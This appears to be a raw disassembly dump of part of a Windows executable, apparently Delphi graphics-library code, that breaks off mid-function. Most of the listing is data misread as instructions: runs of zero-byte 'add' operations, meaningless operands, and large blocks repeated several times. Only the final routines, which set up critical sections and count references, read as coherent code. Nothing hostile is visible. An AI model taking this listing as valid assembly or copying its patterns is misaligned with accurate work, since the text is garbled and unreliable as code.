add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dh
jb r-xdata
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fstp st6
das
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x423060c0 ] cl
add dl dh
das
jo r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0x7a600042
inc edx
add ah ch
push 0x7af00042
inc edx
add al bh
jpe r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
int3
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] dh
inc edx
add [ eax ] dh
add [ eax ] al
add al al
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edi * 2 - 0x7207ffbe ] bl
inc ecx
add [ eax - 0x33ffbd98 ] ah
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edi * 2 ] dl
inc edx
add [ eax + 0x79 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x30 ] dh
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
pushad
xor [ edx ] al
das
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_4275d0
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
push esp
add [ ebx + edi * 2 + 0x42 ] bl
add [ eax ] bh
push 0x42
add al ch
jpo r-xdata
dec ebp
je r-xdata
push 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x31 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop esp
sub [ eax ] eax
or al 0x54
push ebx
push 0x64657261
dec ecx
adc [ eax ] al
nop
int3
add [ ebx + esi + 0x33780040 ] al
imul bp [ ebp - 0x75 ] 0x40c0
xor al [ edx ]
pop es
add al cl
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x340042 ] dh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
mov al 0x42
add al bh
lea eax [ ecx ]
mov al [ 0x30004268 ]
mov al 0x42
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0xb0900042
inc edx
add ah ch
push 0xb0d00042
inc edx
add ah bh
mov al 0x42
add [ edx + ebp * 2 ] dh
inc edx
add [ eax ] bh
push 0x42
add [ eax ] dl
mov cl 0x42
add [ eax - 0x6bffbd96 ] bh
mov bl 0x42
add [ ebx + ebp * 2 ] bl
inc edx
add [ ebx + esi * 4 - 0x4c4fffbe ] ch
inc edx
add [ eax ] dh
imul eax [ edx ] 0xffffffac
scasd [ edi ]
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add [ eax - 0x4e ] dl
inc edx
add al cl
mov bl 0x42
add al dh
mov bl 0x42
add [ esp + esi * 4 ] al
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
shl [ edx + eax * 2 ] 0x0
pop es
add eax 0x6f634954
outsb
push eax
xor al 0x42
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
hlt
xchg esp eax
mov [ edx ] eax
imul bp [ ebp - 0x34 ] 0x4231
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ edi + edi * 2 + 0x7c4c0042 ] al
inc edx
add [ eax - 0x80 ] cl
inc edx
add [ eax ] al
test [ edx ] eax
test [ ebp + 0x54090042 ] al
add [ eax + eax * 4 + 0x42 ] ah
add [ ebx + ebp * 2 ] bl
inc edx
add [ eax - 0x7f ] dl
inc edx
add [ ecx + eax * 4 + 0x42 ] dl
add [ edx + eax * 4 + 0x79540042 ] ch
inc edx
add [ edx + ebp * 2 ] bh
inc edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4233 ] cl
imul esp [ ebx + 0x73 ] 0x32ac0000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004232 ] dh
add [ eax ] al
add al al
xor [ edx ] al
jo r-xdata
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x42 ] bh
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] dh
inc edx
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ecx * 4 - 0x760fffbe ] dl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
or al 0x33
inc edx
pop esi
pop ebx
retn
call sub_4034dc
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
xchg esp eax
inc edx
add [ eax - 0x71 ] cl
inc ecx
add [ eax + 0x10004296 ] dl
xchg edi eax
inc edx
add ah ch
push 0x99c40042
inc edx
add [ eax - 0x66 ] bh
inc edx
add [ eax + 0x3800429a ] bh
push 0x42
add [ eax ] al
pushfd
inc edx
add [ eax + 0x42 ] cl
add [ eax - 0x58 ] cl
inc edx
add [ ecx + ebp * 4 ] bl
inc edx
add [ eax ] ah
imul eax [ edx ] 0xffffffa8
stosd [ edi ]
inc edx
add ah bh
stosd [ edi ]
inc edx
add [ eax ] bl
xchg esp eax
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add al cl
sahf
inc edx
add [ esi + ebp * 4 - 0x61bbffbe ] bh
inc edx
add ah al
scasb [ edi ]
inc edx
add [ eax ] ch
0x9a880042 0x42
adc [ edi + 0x54070042 ] ah
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42338870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42330c70
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax + eax ] bh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffbd6c ] al
lea eax [ ecx ]
mov al [ 0xffffffffbc004268 ]
inc edx
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423086
cld
[ esi + esi * 2 + 0x42 ]
add [ eax + 0x8004276 ] al
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax + 0x7004230 ] ah
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
pushad
xor [ edx ] al
call sub_427213
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
insb
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
je r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
shl [ eax ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc edx
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc900000
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] dh
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x70004010 ] dh
xor eax [ eax ]
jl r-xdata
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0x7a600042
inc edx
add ah ch
push 0x7af00042
inc edx
add al bh
jpe r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
int3
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] dh
inc edx
add [ eax ] dh
add [ eax ] al
add al al
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edi * 2 - 0x7207ffbe ] bl
inc ecx
add [ eax - 0x33ffbd98 ] ah
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edi * 2 ] dl
inc edx
add [ eax + 0x79 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
push esp
add [ ebx + edi * 2 + 0x42 ] bl
add [ eax ] bh
push 0x42
add al ch
jpo r-xdata
dec ebp
je r-xdata
push 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x31 ] dh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
pop esp
sub [ eax ] eax
or al 0x54
push ebx
push 0x64657261
dec ecx
add [ ebx + esi + 0x33780040 ] al
imul bp [ ebp - 0x75 ] 0x40c0
xor al [ edx ]
pop es
add al cl
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x340042 ] dh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
mov al 0x42
add al bh
lea eax [ ecx ]
mov al [ 0x30004268 ]
mov al 0x42
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0xb0900042
inc edx
add ah ch
push 0xb0d00042
inc edx
add ah bh
mov al 0x42
add [ edx + ebp * 2 ] dh
inc edx
add [ eax ] bh
push 0x42
add [ eax ] dl
mov cl 0x42
add [ eax - 0x6bffbd96 ] bh
mov bl 0x42
add [ ebx + ebp * 2 ] bl
inc edx
add [ ebx + esi * 4 - 0x4c4fffbe ] ch
inc edx
add [ eax ] dh
imul eax [ edx ] 0xffffffac
scasd [ edi ]
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add [ eax - 0x4e ] dl
inc edx
add al cl
mov bl 0x42
add al dh
mov bl 0x42
add [ esp + esi * 4 ] al
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
shl [ edx + eax * 2 ] 0x0
pop es
add eax 0x6f634954
outsb
push eax
xor al 0x42
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
hlt
xchg esp eax
mov [ edx ] eax
imul bp [ ebp - 0x34 ] 0x4231
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ edi + edi * 2 + 0x7c4c0042 ] al
inc edx
add [ eax - 0x80 ] cl
inc edx
add [ eax ] al
test [ edx ] eax
test [ ebp + 0x54090042 ] al
add [ eax + eax * 4 + 0x42 ] ah
add [ ebx + ebp * 2 ] bl
inc edx
add [ eax - 0x7f ] dl
inc edx
add [ ecx + eax * 4 + 0x42 ] dl
add [ edx + eax * 4 + 0x79540042 ] ch
inc edx
add [ edx + ebp * 2 ] bh
inc edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4233 ] cl
imul esp [ ebx + 0x73 ] 0x32ac0000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004232 ] dh
add [ eax ] al
add al al
xor [ edx ] al
jo r-xdata
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x42 ] bh
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] dh
inc edx
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ecx * 4 - 0x760fffbe ] dl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
or al 0x33
inc edx
pop esi
pop ebx
retn
call sub_4034dc
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
xchg esp eax
inc edx
add [ eax - 0x71 ] cl
inc ecx
add [ eax + 0x10004296 ] dl
xchg edi eax
inc edx
add ah ch
push 0x99c40042
inc edx
add [ eax - 0x66 ] bh
inc edx
add [ eax + 0x3800429a ] bh
push 0x42
add [ eax ] al
pushfd
inc edx
add [ eax + 0x42 ] cl
add [ eax - 0x58 ] cl
inc edx
add [ ecx + ebp * 4 ] bl
inc edx
add [ eax ] ah
imul eax [ edx ] 0xffffffa8
stosd [ edi ]
inc edx
add ah bh
stosd [ edi ]
inc edx
add [ eax ] bl
xchg esp eax
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add al cl
sahf
inc edx
add [ esi + ebp * 4 - 0x61bbffbe ] bh
inc edx
add ah al
scasb [ edi ]
inc edx
add [ eax ] ch
0x9a880042 0x42
adc [ edi + 0x54070042 ] ah
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42338870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42330c70
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax + eax ] bh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffbd6c ] al
lea eax [ ecx ]
mov al [ 0xffffffffbc004268 ]
inc edx
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423184
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] dh
inc edx
add [ eax ] dh
add [ eax ] al
add al al
inc edx
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edi * 2 - 0x7207ffbe ] bl
inc ecx
add [ eax - 0x33ffbd98 ] ah
jns r-xdata
push 0x42
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0x7a600042
inc edx
add ah ch
push 0x7af00042
inc edx
add al bh
jpe r-xdata
add [ ebx + esi + 0x33780040 ] al
imul bp [ ebp - 0x75 ] 0x40c0
dec ebp
je r-xdata
push esp
add [ ebx + edi * 2 + 0x42 ] bl
add [ eax ] bh
push 0x42
add al ch
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x340042 ] dh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
mov al 0x42
add al bh
lea eax [ ecx ]
mov al [ 0x30004268 ]
mov al 0x42
add [ eax - 0x71 ] cl
inc ecx
add [ eax ] dh
push 0xb0900042
inc edx
add ah ch
push 0xb0d00042
inc edx
add ah bh
mov al 0x42
add [ edx + ebp * 2 ] dh
inc edx
add [ eax ] bh
push 0x42
add [ eax ] dl
mov cl 0x42
add [ eax - 0x6bffbd96 ] bh
mov bl 0x42
add [ ebx + ebp * 2 ] bl
inc edx
add [ ebx + esi * 4 - 0x4c4fffbe ] ch
inc edx
add [ eax ] dh
imul eax [ edx ] 0xffffffac
scasd [ edi ]
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add [ eax - 0x4e ] dl
inc edx
add al cl
mov bl 0x42
add al dh
mov bl 0x42
add [ esp + esi * 4 ] al
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
shl [ edx + eax * 2 ] 0x0
pop es
add eax 0x6f634954
outsb
push eax
xor al 0x42
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
hlt
xchg esp eax
mov [ edx ] eax
imul bp [ ebp - 0x34 ] 0x4231
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
xor al [ edx ]
pop es
add al cl
jl r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4233 ] cl
imul esp [ ebx + 0x73 ] 0x32ac0000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004232 ] dh
add [ eax ] al
add al al
xor [ edx ] al
jo r-xdata
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ edi + edi * 2 + 0x7c4c0042 ] al
inc edx
add [ eax - 0x80 ] cl
inc edx
add [ eax ] al
test [ edx ] eax
test [ ebp + 0x54090042 ] al
add [ eax + eax * 4 + 0x42 ] ah
add [ ebx + ebp * 2 ] bl
inc edx
add [ eax - 0x7f ] dl
inc edx
add [ ecx + eax * 4 + 0x42 ] dl
add [ edx + eax * 4 + 0x79540042 ] ch
inc edx
add [ edx + ebp * 2 ] bh
inc edx
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x42 ] bh
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] dh
inc edx
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ecx * 4 - 0x760fffbe ] dl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
or al 0x33
inc edx
pop esi
pop ebx
retn
call sub_4034dc
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
xchg esp eax
inc edx
add [ eax - 0x71 ] cl
inc ecx
add [ eax + 0x10004296 ] dl
xchg edi eax
inc edx
add ah ch
push 0x99c40042
inc edx
add [ eax - 0x66 ] bh
inc edx
add [ eax + 0x3800429a ] bh
push 0x42
add [ eax ] al
pushfd
inc edx
add [ eax + 0x42 ] cl
add [ eax - 0x58 ] cl
inc edx
add [ ecx + ebp * 4 ] bl
inc edx
add [ eax ] ah
imul eax [ edx ] 0xffffffa8
stosd [ edi ]
inc edx
add ah bh
stosd [ edi ]
inc edx
add [ eax ] bl
xchg esp eax
inc edx
add [ edx + ebp * 2 ] bh
inc edx
add ah al
push 0x42
add al cl
sahf
inc edx
add [ esi + ebp * 4 - 0x61bbffbe ] bh
inc edx
add ah al
scasb [ edi ]
inc edx
add [ eax ] ch
0x9a880042 0x42
adc [ edi + 0x54070042 ] ah
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42338870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42330c70
add [ edi + ebp + 0x42 ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax + eax ] bh
add [ eax ] al
shr [ esi ] 0x42
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x7fffbe72 ] bh
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7ffbd6c ] al
lea eax [ ecx ]
mov al [ 0xffffffffbc004268 ]
inc edx
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4234f0
cmp al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x240042 ] bh
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
lea eax [ eax ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x10004235 ] ah
push esp
push edx
jae r-xdata
sub edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_4034dc
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423564
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4235a0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4235dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_423550
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor edx edx
push ebp
push sub_4236b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236b7
mov eax [ ebp - 0x4 ]
call sub_4235d0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407e00
test al al
je r-xdata
sub_4236c0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor ecx ecx
push ebp
push sub_423747
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
